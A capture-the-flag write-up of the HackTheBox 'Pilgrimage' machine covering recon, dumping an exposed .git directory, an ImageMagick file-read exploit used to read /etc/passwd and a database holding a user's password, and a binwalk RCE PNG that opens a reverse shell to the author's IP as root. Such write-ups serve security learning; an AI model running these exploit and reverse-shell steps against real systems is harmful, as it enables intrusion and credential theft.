---
title: Pilgrimage
date: 2023-10-15
description: Pilgrimage | easy | HTB
categories:
- htb-easy
tags:
  - ImageMagick
  - Binwalk
---

Pilgrimage is an easy machine from hackthebox which involved finding a git directory leading to a arbitrary file read vulnerability in ImageMagick. Using that read the databse file and got credentials of emily user. Found a folder named binwalk in emily's directory and the binary version was vulnerable to rce. One of the script malwarescan.sh was running as root user and the malicious png file generated from binwalk exploit was to be placed under the mentioned directory in this script to get shell as root user.

<!--more-->

## Port Scan

```bash
# nmap -sC -sV -p- -vv --reason --min-rate=1000 -T4 $ip -oN nmap_tcp_scan

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnPDlM1cNfnBOJE71gEOCGeNORg5gzOK/TpVSXgMLa6Ub/7KPb1hVggIf4My+cbJVk74fKabFVscFgDHtwPkohPaDU8XHdoO03vU8H04T7eqUGj/I2iqyIHXQoSC4o8Jf5ljiQi7CxWWG2t0n09CPMkwdqfEJma7BGmDtCQcmbm36QKmUv6Kho7/LgsPJGBP1kAOgUHFfYN1TEAV6TJ09OaCanDlV/fYiG+JT1BJwX5kqpnEAK012876UFfvkJeqPYXvM0+M9mB7XGzspcXX0HMbvHKXz2HXdCdGSH59Uzvjl0dM+itIDReptkGUn43QTCpf2xJlL4EeZKZCcs/gu8jkuxXpo9lFVkqgswF/zAcxfksjytMiJcILg4Ca1VVMBs66ZHi5KOz8QedYM2lcLXJGKi+7zl3i8+adGTUzYYEvMQVwjXG0mPkHHSldstWMGwjXqQsPoQTclEI7XpdlRdjS6S/WXHixTmvXGTBhNXtrETn/fBw4uhJx4dLxNSJeM=
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg=
|   256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80

- Did directory bruteforce and found a ***.git*** directory

```bash
┌──(kali㉿kali)-[~/htb/pilgrimage]
└─$ gobuster dir -u http://pilgrimage.htb/ -w ~/wordlist/web/common.txt -t 40

/.hta                 (Status: 403) [Size: 153]
/.git/HEAD            (Status: 200) [Size: 23]
/.htpasswd            (Status: 403) [Size: 153]
/.htaccess            (Status: 403) [Size: 153]
/assets               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/assets/]
/index.php            (Status: 200) [Size: 7621]
/tmp                  (Status: 301) [Size: 169] [--> http://pilgrimage.htb/tmp/]
/vendor               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/vendor/]
```

- Used **git-dumper** to dump the git directory: `git-dumper http://pilgrimage.htb/.git/ ./pilgrimage-site`
- Found a binary file name ***magick*** and searched for its version: **ImageMagick 7.1.0-49**
- This version is vulnerable to ***Arbitrary file read vuln*** (https://github.com/Sybil-Scan/imagemagick-lfi-poc)
- Following this exploit Generated a malicious png file with ***/etc/passwd*** for file content read: `python3 [generate.py](http://generate.py/) -f "/etc/passwd" -o exploit.png`
- Uploaded the file on website. Downloaded the image and extracted the text from it. Then decoded the hex bytes using python

```bash
wget http://pilgrimage.htb/shrunk/651a9c424fa36.png

identify -verbose 651a9c424fa36.png

python3 -c 'print(bytes.fromhex("726f6f743a78...").decode("utf-8"))'
```

- We get content of ***/etc/passwd.*** Also got a user named emily
- In the git repository we found a file ***dashboard.php*** in which was mention of a database file **sqlite:/var/db/pilgrimage**
- To get content of this file did the above same steps only changed the filename to **/var/db/pilgrimage.**
- Decoding this in cyberchef we got a ***sqlite db file***
- Downloaded the file and opened it in a sqlite3 shell: `sqlite3 download.sqlite`

```bash
sqlite> .tables
images  users
sqlite> select * from users
   ...> ;
emily|abigchonkyboi123
test|test
sqlite>
```

- From here we got the credentials of emily user

## Enum as emily user

- In the ***.config*** directory found a **binwalk** folder. Looking for its version it is **v2.3.2**
- Searching on **searchsploit** it is vulnerable to RCE.
- Transferred the ***[exploit.py](http://exploit.py)*** file to **emily’s** shell and ran: `python3 [exploit.py](http://exploit.py/) ./image.png 10.10.14.81 8888`
- It generated a malicious ***.png file.***
- Started the nc listener & uploaded this file thru the website but the connection was not getting back
- Doing `ps -ef` saw two processes running as root

```bash
root   /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root   /bin/bash /usr/sbin/malwarescan.sh
```

- Saw contents of ***[malwarescan.sh](http://malwarescan.sh)***

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

- So we need to put our **malicious.png** file in **/var/www/pilgrimage.htb/shrunk/** directory to run it as root.
- Copied the file there and got shell as root after some time on nc listener